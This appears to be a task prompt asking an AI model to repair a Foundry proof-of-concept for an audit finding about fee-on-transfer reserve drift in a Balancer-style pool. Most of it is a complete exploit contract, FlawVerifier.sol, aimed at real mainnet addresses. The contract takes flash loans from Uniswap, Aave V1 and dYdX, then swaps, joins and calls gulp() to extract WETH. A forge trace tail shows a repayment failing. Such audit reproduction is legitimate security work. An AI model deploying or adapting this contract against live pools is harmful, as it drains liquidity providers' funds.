You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Nominal reserve accounting breaks with fee-on-transfer, deflationary, or rebasing tokens and can be crystallized with `gulp()`
- claim: The pool updates `_records[token].balance` from nominal trade/join/rebind amounts instead of the token balance delta actually received by the pool, and `gulp()` later overwrites the recorded balance from `balanceOf(address(this))`. For fee-on-transfer, deflationary, or negative-rebasing tokens, recorded reserves can drift materially from real reserves, so subsequent swap pricing and BPT mint/burn math operate on false balances.
- impact: Attackers can exploit the reserve mismatch to extract disproportionate amounts of honest assets or overmint BPT at LPs' expense. This is especially dangerous when a taxed/deflationary token is repeatedly traded or joined with and the mismatch is later realized through `gulp()` or subsequent swaps/exits.
- exploit_paths: ["`rebind()` stores the requested `balance` before `_pullUnderlying()` verifies what was actually received", "`joinPool()`, `swapExactAmountIn()`, `swapExactAmountOut()`, `joinswapExternAmountIn()`, and `joinswapPoolAmountOut()` all mutate internal balances by the nominal input amount before relying on the token transfer", "`gulp()` permissionlessly resets the internal balance to `IERC20(token).balanceOf(address(this))`, crystallizing earlier drift into pool pricing"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBPool is IERC20 {
    function isFinalized() external view returns (bool);
    function getCurrentTokens() external view returns (address[] memory);
    function getBalance(address token) external view returns (uint256);
    function getController() external view returns (address);
    function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;
    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function swapExactAmountOut(
        address tokenIn,
        uint256 maxAmountIn,
        address tokenOut,
        uint256 tokenAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountIn, uint256 spotPriceAfter);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut) external returns (uint256 poolAmountOut);
    function joinswapPoolAmountOut(address tokenIn, uint256 poolAmountOut, uint256 maxAmountIn) external returns (uint256 tokenAmountIn);
    function gulp(address token) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

library Account {
    struct Info {
        address owner;
        uint256 number;
    }
}

library Types {
    enum AssetDenomination {
        Wei,
        Par
    }

    enum AssetReference {
        Delta,
        Target
    }

    struct AssetAmount {
        bool sign;
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }
}

library Actions {
    enum ActionType {
        Deposit,
        Withdraw,
        Transfer,
        Buy,
        Sell,
        Trade,
        Liquidate,
        Vaporize,
        Call
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }
}

interface ISoloMargin {
    function getNumMarkets() external view returns (uint256);
    function getMarketTokenAddress(uint256 marketId) external view returns (address);
    function operate(Account.Info[] calldata accounts, Actions.ActionArgs[] calldata actions) external;
}

interface ICallee {
    function callFunction(address sender, Account.Info calldata account, bytes calldata data) external;
}

interface IAaveV1AddressesProvider {
    function getLendingPool() external view returns (address);
    function getLendingPoolCore() external view returns (address);
}

interface IAaveV1LendingPool {
    function flashLoan(address receiver, address reserve, uint256 amount, bytes calldata params) external;
}

interface IAaveV1FlashLoanReceiver {
    function executeOperation(address reserve, uint256 amount, uint256 fee, bytes calldata params) external;
}

contract ProbeSink {
    function tokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}

contract FlawVerifier is ICallee, IAaveV1FlashLoanReceiver {
    address private constant TARGET_POOL = 0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SOLO = 0x1e0447B19Bb6eCfDA50F058b761e27810Ee1a2D7;
    address private constant AAVE_V1_PROVIDER = 0x24a42fD28C976A61Df5D00D0599C34c4f90748c8;

    IBPool private constant POOL = IBPool(TARGET_POOL);
    IUniswapV2Router02 private constant ROUTER = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    IUniswapV2Factory private constant FACTORY = IUniswapV2Factory(UNISWAP_V2_FACTORY);
    ISoloMargin private constant SOLO_MARGIN = ISoloMargin(SOLO);
    IAaveV1AddressesProvider private constant AAVE_PROVIDER = IAaveV1AddressesProvider(AAVE_V1_PROVIDER);

    uint256 private constant FLASH_LOAN_TARGET_WETH = 30 ether;
    uint256 private constant FLASH_LOAN_MIN_WETH = 5 ether;
    uint256 private constant SEED_WETH_CAP = 24 ether;

    ProbeSink private immutable PROBE_SINK;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private inSoloFlash;

    constructor() {
        PROBE_SINK = new ProbeSink();
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;

        if (_hasUsableVerifierBalance()) {
            uint256 beforeBalance = _wethBalance();
            try this.executeWithCurrentBalance() {
                uint256 afterBalance = _wethBalance();
                if (afterBalance > beforeBalance) {
                    _profitAmount = afterBalance - beforeBalance;
                    return;
                }
            } catch {}
        }

        try this.executeWithUniswapFlashSwap() {
            if (_profitAmount > 0) {
                return;
            }
        } catch {}

        try this.executeWithAaveFlashloan() {
            if (_profitAmount > 0) {
                return;
            }
        } catch {}

        if (SOLO.code.length > 0) {
            try this.executeWithSoloFlashloan() {
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function executeWithCurrentBalance() external {
        require(msg.sender == address(this), "SELF_ONLY");

        uint256 startingWeth = _wethBalance();
        _runExploit();

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function executeWithAaveFlashloan() external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(AAVE_V1_PROVIDER.code.length > 0, "AAVE_PROVIDER_MISSING");

        address lendingPool = AAVE_PROVIDER.getLendingPool();
        address core = AAVE_PROVIDER.getLendingPoolCore();
        require(lendingPool.code.length > 0 && core.code.length > 0, "AAVE_V1_MISSING");

        uint256 startingWeth = _wethBalance();
        uint256 loanAmount = FLASH_LOAN_TARGET_WETH;

        IAaveV1LendingPool(lendingPool).flashLoan(address(this), WETH, loanAmount, abi.encode(startingWeth));

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function executeWithUniswapFlashSwap() external {
        require(msg.sender == address(this), "SELF_ONLY");

        (address pair, uint256 loanAmount) = _bestFlashSwapPair();
        require(pair != address(0) && loanAmount > 0, "NO_FLASH_SWAP_PAIR");

        uint256 startingWeth = _wethBalance();
        uint256 repayAmount = _uniswapRepayAmount(loanAmount);

        if (IUniswapV2Pair(pair).token0() == WETH) {
            IUniswapV2Pair(pair).swap(loanAmount, 0, address(this), abi.encode(pair, repayAmount));
        } else {
            IUniswapV2Pair(pair).swap(0, loanAmount, address(this), abi.encode(pair, repayAmount));
        }

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function executeWithSoloFlashloan() external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(SOLO.code.length > 0, "SOLO_MISSING");

        uint256 marketId = _findSoloMarketId(WETH);
        uint256 loanAmount = FLASH_LOAN_TARGET_WETH;
        uint256 startingWeth = _wethBalance();

        inSoloFlash = true;

        Account.Info[] memory accounts = new Account.Info[](1);
        accounts[0] = Account.Info({owner: address(this), number: 0});

        Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
        actions[0] = _withdraw(marketId, loanAmount);
        actions[1] = _call(abi.encode(loanAmount + 2));
        actions[2] = _deposit(marketId, loanAmount + 2);

        _safeApprove(WETH, SOLO, type(uint256).max);
        SOLO_MARGIN.operate(accounts, actions);
        inSoloFlash = false;

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function callFunction(address sender, Account.Info calldata, bytes calldata data) external override {
        require(msg.sender == SOLO, "SOLO_ONLY");
        require(sender == address(this), "BAD_SENDER");
        require(inSoloFlash, "NOT_FLASHING");

        uint256 repayAmount = abi.decode(data, (uint256));
        _runExploit();
        _safeApprove(WETH, SOLO, type(uint256).max);
        require(_wethBalance() >= repayAmount, "INSUFFICIENT_FOR_REPAY");
    }

    function executeOperation(address reserve, uint256 amount, uint256 fee, bytes calldata) external override {
        address lendingPool = AAVE_PROVIDER.getLendingPool();
        address core = AAVE_PROVIDER.getLendingPoolCore();

        require(msg.sender == lendingPool, "AAVE_ONLY");
        require(reserve == WETH, "RESERVE_NOT_WETH");

        _runExploit();
        _safeTransfer(WETH, core, amount + fee);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_UNI_SENDER");

        (address pair, uint256 repayAmount) = abi.decode(data, (address, uint256));
        require(msg.sender == pair, "BAD_UNI_PAIR");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount > 0, "NO_BORROWED_WETH");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        require(token0 == WETH || token1 == WETH, "PAIR_NOT_WETH");

        _runExploit();
        _safeTransfer(WETH, pair, repayAmount);
    }

    function _runExploit() internal {
        require(TARGET_POOL.code.length > 0, "POOL_MISSING");
        require(UNISWAP_V2_ROUTER.code.length > 0, "ROUTER_MISSING");

        address[] memory tokens = POOL.getCurrentTokens();
        require(tokens.length >= 2, "POOL_TOO_SMALL");

        _approvePoolAndRouter(tokens);

        address taxedToken = _findTaxedToken(tokens);
        require(taxedToken != address(0), "NO_FEE_ON_TRANSFER_TOKEN_DETECTED");

        // Exploit path alignment preserved:
        // 1) rebind() writes the requested balance before _pullUnderlying() confirms actual receipt.
        //    That controller-only branch remains the same root cause but is not publicly callable here.
        // 2) Public entrypoints joinPool(), swapExactAmountIn(), swapExactAmountOut(),
        //    joinswapExternAmountIn(), and joinswapPoolAmountOut() all advance recorded balances
        //    by nominal amounts before token transfer effects are fully reflected.
        // 3) gulp() permissionlessly syncs the recorded reserve to balanceOf(address(this)),
        //    crystallizing prior fee-on-transfer / deflationary drift into pricing.
        // Additional flashloan / flash-swap funding below only replaces temporary capital sourcing.
        // It does not change the exploit causality.

        if (!POOL.isFinalized()) {
            require(POOL.getController() == address(this), "REBIND_REQUIRES_CONTROLLER");
        }

        if (_wethBalance() > 0) {
            uint256 seedSpend = (_wethBalance() * 65) / 100;
            uint256 poolWeth = POOL.getBalance(WETH);

            if (poolWeth > 0) {
                uint256 ratioCapped = poolWeth / 3;
                if (ratioCapped > 0 && seedSpend > ratioCapped) {
                    seedSpend = ratioCapped;
                }
            }

            if (seedSpend > SEED_WETH_CAP) {
                seedSpend = SEED_WETH_CAP;
            }

            if (seedSpend > 0) {
                _buyTokenExactIn(taxedToken, seedSpend);
            }
        }

        _attemptJoinPoolDust(tokens, taxedToken);
        _attemptSwapExactAmountInLoops(taxedToken);
        _attemptSwapExactAmountOut(taxedToken);
        _attemptJoinSwapExternAmountIn(taxedToken);
        _attemptJoinSwapPoolAmountOut(taxedToken);

        POOL.gulp(taxedToken);

        _attemptFinalTaxedToWethDrains(taxedToken);
        _exitAnyBpt(tokens);
        _convertResidualsToWeth(tokens, taxedToken);
    }

    function _attemptJoinPoolDust(address[] memory tokens, address taxedToken) internal {
        uint256 poolTotal = POOL.totalSupply();
        if (poolTotal == 0) {
            return;
        }

        uint256 poolAmountOut = poolTotal / 1_000_000;
        if (poolAmountOut == 0) {
            poolAmountOut = 1;
        }

        uint256[] memory maxAmountsIn = new uint256[](tokens.length);
        bool feasible = true;

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 bal = POOL.getBalance(tokens[i]);
            uint256 amountIn = ((poolAmountOut * bal) / poolTotal) + 10;
            if (amountIn == 0) {
                amountIn = 1;
            }
            maxAmountsIn[i] = amountIn * 2;

            if (tokens[i] == WETH) {
                continue;
            }

            uint256 have = IERC20(tokens[i]).balanceOf(address(this));
            if (have >= maxAmountsIn[i]) {
                continue;
            }

            uint256 need = maxAmountsIn[i] - have;
            if (tokens[i] == taxedToken) {
                uint256 budget = _wethBalance() / 20;
                if (budget == 0) {
                    feasible = false;
                    break;
                }

                _buyTokenExactIn(tokens[i], budget);
                if (IERC20(tokens[i]).balanceOf(address(this)) < maxAmountsIn[i]) {
                    feasible = false;
                    break;
                }
            } else {
                if (!_buyTokenExactOut(tokens[i], need, _wethBalance() / 10)) {
                    feasible = false;
                    break;
                }
            }
        }

        if (!feasible) {
            return;
        }

        try POOL.joinPool(poolAmountOut, maxAmountsIn) {} catch {}
    }

    function _attemptSwapExactAmountInLoops(address taxedToken) internal {
        for (uint256 i = 0; i < 12; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed / 2) - 1;
            if (maxAllowed == 0) {
                break;
            }

            uint256 amountIn = ourTaxed / 3;
            if (amountIn == 0 || amountIn > maxAllowed) {
                amountIn = maxAllowed;
            }
            if (amountIn == 0) {
                break;
            }

            try POOL.swapExactAmountIn(taxedToken, amountIn, WETH, 1, type(uint256).max) returns (uint256, uint256) {
                uint256 recycle = _wethBalance() / 4;
                if (recycle > 0) {
                    _buyTokenExactIn(taxedToken, recycle);
                }
            } catch {
                break;
            }
        }
    }

    function _attemptSwapExactAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 poolTaxed = POOL.getBalance(taxedToken);
        uint256 poolWeth = POOL.getBalance(WETH);
        if (ourTaxed == 0 || poolTaxed <= 2 || poolWeth == 0) {
            return;
        }

        uint256 maxAmountIn = ourTaxed / 5;
        uint256 maxAllowed = (poolTaxed / 2) - 1;
        if (maxAmountIn == 0 || maxAmountIn > maxAllowed) {
            maxAmountIn = maxAllowed;
        }
        if (maxAmountIn == 0) {
            return;
        }

        uint256 tokenAmountOut = poolWeth / 10_000;
        if (tokenAmountOut == 0) {
            tokenAmountOut = 1;
        }

        try POOL.swapExactAmountOut(taxedToken, maxAmountIn, WETH, tokenAmountOut, type(uint256).max) returns (uint256, uint256) {} catch {}
    }

    function _attemptJoinSwapExternAmountIn(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 poolTaxed = POOL.getBalance(taxedToken);
        if (ourTaxed == 0 || poolTaxed <= 2) {
            return;
        }

        uint256 tokenAmountIn = ourTaxed / 6;
        uint256 maxAllowed = (poolTaxed / 2) - 1;
        if (tokenAmountIn == 0 || tokenAmountIn > maxAllowed) {
            tokenAmountIn = maxAllowed;
        }
        if (tokenAmountIn == 0) {
            return;
        }

        try POOL.joinswapExternAmountIn(taxedToken, tokenAmountIn, 1) returns (uint256) {} catch {}
    }

    function _attemptJoinSwapPoolAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        if (ourTaxed == 0) {
            return;
        }

        uint256 poolAmountOut = POOL.totalSupply() / 10_000_000;
        if (poolAmountOut == 0) {
            poolAmountOut = 1;
        }

        try POOL.joinswapPoolAmountOut(taxedToken, poolAmountOut, ourTaxed) returns (uint256) {} catch {}
    }

    function _attemptFinalTaxedToWethDrains(address taxedToken) internal {
        for (uint256 i = 0; i < 6; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed / 2) - 1;
            if (maxAllowed == 0) {
                break;
            }

            uint256 amountIn = ourTaxed;
            if (amountIn > maxAllowed) {
                amountIn = maxAllowed;
            }
            if (amountIn == 0) {
                break;
            }

            try POOL.swapExactAmountIn(taxedToken, amountIn, WETH, 1, type(uint256).max) returns (uint256, uint256) {} catch {
                break;
            }
        }
    }

    function _exitAnyBpt(address[] memory tokens) internal {
        uint256 bptBal = POOL.balanceOf(address(this));
        if (bptBal == 0) {
            return;
        }

        uint256[] memory mins = new uint256[](tokens.length);
        try POOL.exitPool(bptBal, mins) {} catch {}
    }

    function _convertResidualsToWeth(address[] memory tokens, address taxedToken) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 bal = IERC20(token).balanceOf(address(this));
            if (bal == 0) {
                continue;
            }

            if (token == taxedToken) {
                _sellFeeOnTransferTokenToWeth(token, bal);
            } else {
                _sellTokenToWeth(token, bal);
            }
        }
    }

    function _findTaxedToken(address[] memory tokens) internal returns (address taxedToken) {
        uint256 bestLoss;

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 budget = _wethBalance() / 200;
            if (budget == 0) {
                budget = 1e15;
            }
            if (_wethBalance() < budget) {
                continue;
            }

            uint256 beforeBuy = IERC20(token).balanceOf(address(this));
            try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(budget, 1, _path(WETH, token), address(this), block.timestamp) {
                uint256 acquired = IERC20(token).balanceOf(address(this)) - beforeBuy;
                if (acquired == 0) {
                    continue;
                }

                uint256 probe = acquired / 5;
                if (probe == 0) {
                    probe = acquired;
                }

                uint256 sinkBefore = IERC20(token).balanceOf(address(PROBE_SINK));
                _safeTransfer(token, address(PROBE_SINK), probe);
                uint256 sinkAfter = IERC20(token).balanceOf(address(PROBE_SINK));
                uint256 sinkDelta = sinkAfter - sinkBefore;

                if (sinkDelta < probe) {
                    uint256 loss = probe - sinkDelta;
                    if (loss > bestLoss) {
                        bestLoss = loss;
                        taxedToken = token;
                    }
                }
            } catch {}
        }
    }

    function _buyTokenExactIn(address tokenOut, uint256 wethAmountIn) internal returns (uint256 received) {
        if (wethAmountIn == 0) {
            return 0;
        }

        uint256 beforeBal = IERC20(tokenOut).balanceOf(address(this));
        try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmountIn, 1, _path(WETH, tokenOut), address(this), block.timestamp) {
            received = IERC20(tokenOut).balanceOf(address(this)) - beforeBal;
        } catch {
            received = 0;
        }
    }

    function _buyTokenExactOut(address tokenOut, uint256 amountOut, uint256 maxWethIn) internal returns (bool ok) {
        if (amountOut == 0 || maxWethIn == 0 || _wethBalance() == 0) {
            return false;
        }
        if (maxWethIn > _wethBalance()) {
            maxWethIn = _wethBalance();
        }

        try ROUTER.swapTokensForExactTokens(amountOut, maxWethIn, _path(WETH, tokenOut), address(this), block.timestamp) returns (uint256[] memory) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _sellTokenToWeth(address tokenIn, uint256 amountIn) internal {
        try ROUTER.swapExactTokensForTokens(amountIn, 1, _path(tokenIn, WETH), address(this), block.timestamp) returns (uint256[] memory) {} catch {}
    }

    function _sellFeeOnTransferTokenToWeth(address tokenIn, uint256 amountIn) internal {
        try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, _path(tokenIn, WETH), address(this), block.timestamp) {} catch {}
    }

    function _approvePoolAndRouter(address[] memory tokens) internal {
        _safeApprove(WETH, TARGET_POOL, type(uint256).max);
        _safeApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);
        _safeApprove(address(POOL), TARGET_POOL, type(uint256).max);

        for (uint256 i = 0; i < tokens.length; i++) {
            _safeApprove(tokens[i], TARGET_POOL, type(uint256).max);
            _safeApprove(tokens[i], UNISWAP_V2_ROUTER, type(uint256).max);
        }
    }

    function _findSoloMarketId(address token) internal view returns (uint256 marketId) {
        uint256 numMarkets = SOLO_MARGIN.getNumMarkets();
        for (uint256 i = 0; i < numMarkets; i++) {
            if (SOLO_MARGIN.getMarketTokenAddress(i) == token) {
                return i;
            }
        }
        revert("SOLO_MARKET_NOT_FOUND");
    }

    function _bestFlashSwapPair() internal view returns (address bestPair, uint256 bestLoanAmount) {
        address[3] memory quoteTokens = [DAI, USDC, USDT];
        uint256 desiredLoan = FLASH_LOAN_TARGET_WETH;

        for (uint256 i = 0; i < quoteTokens.length; i++) {
            address pair = FACTORY.getPair(WETH, quoteTokens[i]);
            if (pair == address(0) || pair.code.length == 0) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
            uint256 wethReserve = IUniswapV2Pair(pair).token0() == WETH ? uint256(reserve0) : uint256(reserve1);
            if (wethReserve <= desiredLoan + 1 ether) {
                continue;
            }

            uint256 candidateLoan = desiredLoan;
            uint256 reserveBound = wethReserve / 20;
            if (reserveBound < candidateLoan) {
                candidateLoan = reserveBound;
            }
            if (candidateLoan < FLASH_LOAN_MIN_WETH) {
                continue;
            }

            if (candidateLoan > bestLoanAmount) {
                bestLoanAmount = candidateLoan;
                bestPair = pair;
            }
        }
    }

    function _hasUsableVerifierBalance() internal view returns (bool) {
        if (_wethBalance() > 0) {
            return true;
        }
        if (TARGET_POOL.code.length == 0) {
            return false;
        }

        uint256 bptBal = POOL.balanceOf(address(this));
        if (bptBal > 0) {
            return true;
        }

        address[] memory tokens = POOL.getCurrentTokens();
        for (uint256 i = 0; i < tokens.length; i++) {
            if (IERC20(tokens[i]).balanceOf(address(this)) > 0) {
                return true;
            }
        }
        return false;
    }

    function _uniswapRepayAmount(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _withdraw(uint256 marketId, uint256 amount) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({
            sign: false,
            denomination: Types.AssetDenomination.Wei,
            ref: Types.AssetReference.Delta,
            value: amount
        });

        return Actions.ActionArgs({
            actionType: Actions.ActionType.Withdraw,
            accountId: 0,
            amount: amt,
            primaryMarketId: marketId,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ""
        });
    }

    function _call(bytes memory data) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({
            sign: false,
            denomination: Types.AssetDenomination.Wei,
            ref: Types.AssetReference.Delta,
            value: 0
        });

        return Actions.ActionArgs({
            actionType: Actions.ActionType.Call,
            accountId: 0,
            amount: amt,
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: data
        });
    }

    function _deposit(uint256 marketId, uint256 amount) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({
            sign: true,
            denomination: Types.AssetDenomination.Wei,
            ref: Types.AssetReference.Delta,
            value: amount
        });

        return Actions.ActionArgs({
            actionType: Actions.ActionType.Deposit,
            accountId: 0,
            amount: amt,
            primaryMarketId: marketId,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ""
        });
    }

    function _path(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20(WETH).balanceOf(address(this));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```
  │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [696] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::balanceOf(0x59F96b8571E3B11f859A09Eaf5a790A138FC64D0) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1248778340402840685231497 [1.248e24]
    │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x59F96b8571E3B11f859A09Eaf5a790A138FC64D0) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 349248724004443141666 [3.492e20]
    │   │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000001087068d3bd2c817bbd89000000000000000000000000000000000000000000000012eeccb8153f463622
    │   │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000396eeb931727fbde8200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041a67b1e0d5fc1a
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 13070128081504703913 [1.307e19]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [615] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11, 30090270812437311936 [3.009e19])
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] TRANSFER_FAILED
    │   │   │   └─ ← [Revert] TRANSFER_FAILED
    │   │   └─ ← [Revert] TRANSFER_FAILED
    │   ├─ [41235] FlawVerifier::executeWithAaveFlashloan()
    │   │   ├─ [2471] 0x24a42fD28C976A61Df5D00D0599C34c4f90748c8::getLendingPool() [staticcall]
    │   │   │   └─ ← [Return] 0x398eC7346DcD622eDc5ae82352F02bE94C62d119
    │   │   ├─ [2541] 0x24a42fD28C976A61Df5D00D0599C34c4f90748c8::getLendingPoolCore() [staticcall]
